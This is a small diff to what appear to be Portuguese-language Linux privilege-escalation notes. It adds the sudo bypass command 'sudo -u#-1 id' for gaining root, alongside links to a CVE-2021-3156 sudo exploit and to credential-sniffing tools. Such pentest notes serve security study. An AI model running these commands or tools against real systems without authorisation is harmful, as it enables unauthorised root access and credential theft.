@@ -61,6 +61,9 @@ sudo -V | head -n1
 Uma das vulnerabilidades mais recentes para sudo carrega o CVE-2021-3156 e é baseado em uma vulnerabilidade de buffer overflow baseada em heap.
 https://github.com/blasty/CVE-2021-3156
 
+# Miss configuration pra root
+sudo -u#-1 id
+
 # Se o alvo tiver tcpdump
 https://github.com/DanMcInerney/net-creds
 https://github.com/lgandx/PCredz
